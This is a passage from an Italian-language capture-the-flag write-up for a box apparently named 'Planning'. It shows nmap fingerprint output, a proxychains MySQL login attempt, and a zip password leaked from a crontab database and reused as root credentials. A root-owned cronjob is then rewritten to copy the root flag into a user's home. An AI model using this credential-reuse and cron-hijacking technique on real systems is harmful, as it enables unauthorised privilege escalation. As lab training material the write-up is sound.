SF:0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Not
SF:esRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,
SF:32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inv
SF:alid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port36737-TCP:V=7.94SVN%I=7%D=11/16%Time=6919FF8C%P=x86_64-pc-linux-gnu
SF:%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nD
SF:ate:\x20Sun,\x2016\x20Nov\x202025\x2016:45:18\x20GMT\r\nContent-Length:
SF:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20
SF:Page\x20Not\x20Found")%r(HTTPOptions,8F,"HTTP/1\.0\x20404\x20Not\x20Fou
SF:nd\r\nDate:\x20Sun,\x2016\x20Nov\x202025\x2016:45:18\x20GMT\r\nContent-
SF:Length:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n4
SF:04:\x20Page\x20Not\x20Found")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest
SF:,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Sun,\x2016\x20Nov\x20
SF:2025\x2016:45:46\x20GMT\r\nContent-Length:\x2019\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\n\r\n404:\x20Page\x20Not\x20Found")%r(LPDS
SF:tring,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
```

### MySQL

L'enumerazione di MySQL tramite proxychains non ha successo a causa delle credenziali mancanti.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $proxychains mysql -h 127.0.0.1 -u enzo -pRioTecRANDEntANT!
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:9050  ...  127.0.0.1:3306  ...  OK
ERROR 1045 (28000): Access denied for user 'enzo'@'localhost' (using password: YES)
```

### http

La porta 8000 ci richiede di autenticarci per accedere e anche qui le credenziali che abbiamo non bastano.

![Desktop View](/assets/img/planning/planning-6.png)

Se enumeriamo la directory opt sull'host della vittima (directory dove di solito si trovano container docker), scopriremo un database: **/opt/crontabs/crontab.db**.

```json
enzo@planning:/opt/crontabs$ cat crontab.db | jq
{
  "name": "Grafana backup",
  "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",
  "schedule": "@daily",
  "stopped": false,
  "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740774983276,
  "saved": false,
  "_id": "GTI22PpoJNtRKg0W"
}
{
  "name": "Cleanup",
  "command": "/root/scripts/cleanup.sh",
  "schedule": "* * * * *",
  "stopped": false,
  "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",
  "logging": "false",
  "mailing": {},
  "created": 1740849309992,
  "saved": false,
  "_id": "gNIRXh1WIc9K7BYX"
}
```

Troviamo la password per i backup. Visto che il file è di root, proviamo ad accedere con le credenziali **root:P4ssw0rdS0pRi0T3c**

![Desktop View](/assets/img/planning/planning-7.png)

Possiamo modificare i cronjob esistenti.

![Desktop View](/assets/img/planning/planning-8.png)

### Exploit

Provo a ottenere una reverse shell, senza successo. Allora, punto a leggere la root flag direttamente.

Sostituisco il comando di backup di grafana con `/bin/cat /root/root.txt > /home/enzo/ciao.txt`.

Eseguo il CronJob e controllo la home directory di enzo.

```shell
enzo@planning:~$ ls
ciao.txt  user.txt
```

Prendiamo la root flag e terminiamo la box.
